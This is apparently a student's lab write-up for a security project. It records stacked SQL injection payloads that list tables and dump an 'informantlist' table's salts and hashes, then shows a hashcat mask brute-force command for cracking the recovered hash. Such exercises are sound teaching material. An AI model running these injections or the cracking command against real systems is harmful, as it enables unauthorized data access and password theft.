# I first noticed that character escaping a single quotation mark and ending the
# SQL query with a semicolon executed the query on the back end returning a empty
# table list. Once we realize this we only need to figure out how to input another
# query of our own following this expression

\';

# Displayed informantlist table of the database

\'; show tables;

# SQL injection revealing all information in tables including salts and hashes

\'; select * from informantlist where 1=1;

# SQL injection specifically requesting for my id

\'; select * from informantlist where id=44951;

# I stored the salt in a file called salt.txt and the corresponding
# hash in hash.txt

Salt: kqDrjz 
Hash: 2c27931c15839c6d5de2d955dce2f87a

# Brute force hashcat code masking 26^6 possible combinations of lowercase characters, ?l,
# as given  by the project spec and output into a file called cracked.txt.
# The cracked hash had the  following format hashcode:salt:password

hashcat -a 3 -m 20 --potfile-disable -e salt.txt hash.txt ?l?l?l?l?l?l -o cracked.txt
